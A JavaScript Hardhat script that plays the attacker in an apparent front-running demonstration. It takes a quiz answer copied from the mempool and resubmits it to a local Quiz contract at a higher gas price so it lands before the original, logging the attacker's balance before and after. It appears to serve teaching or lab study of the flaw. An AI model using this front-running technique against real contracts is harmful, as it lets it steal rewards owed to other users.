const fs = require("fs");
const hre = require("hardhat");
const readline = require("readline");

async function logBalances(label, accounts) {
  console.log(`\n💰 Balances (${label}):`);
  for (const [name, acc] of Object.entries(accounts)) {
    const bal = await acc.provider.getBalance(acc.address);
    console.log(`${name}: ${hre.ethers.formatEther(bal)} ETH`);
  }
}

async function main() {
  const ethers = hre.ethers;
  const quizAddress = fs.readFileSync("quiz-address.txt", "utf8").trim();
  const quiz = await ethers.getContractAt("Quiz", quizAddress);
  const [_, __, attacker] = await ethers.getSigners();

  console.log("🦹 Attacker address:", attacker.address);
  await logBalances("Before Attacker Submission", { attacker });

  const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
  rl.question("Enter the stolen answer from mempool: ", (stolenAnswer) => {
    if (!stolenAnswer) {
      console.error("❌ No answer entered.");
      rl.close();
      return;
    }
    rl.question("Set gas price in GWEI for attacker: ", async (gweiInput) => {
      try {
        const gasPrice = ethers.parseUnits(gweiInput, "gwei");
        console.log(`🚀 Submitting answer '${stolenAnswer}' with ${gweiInput} GWEI gas...`);
        const tx = await quiz.connect(attacker).submitAnswer(stolenAnswer, { gasPrice });
        console.log("🟡 TX sent:", tx.hash);
        await tx.wait();
        console.log("✅ TX mined");
      } catch (err) {
        console.error("❌ TX FAILED:", err);
      } finally {
        await logBalances("After Attacker Submission", { attacker });
        rl.close();
      }
    });
  });
}

main().catch((error) => {
  console.error("ERROR:", error);
  process.exitCode = 1;
});
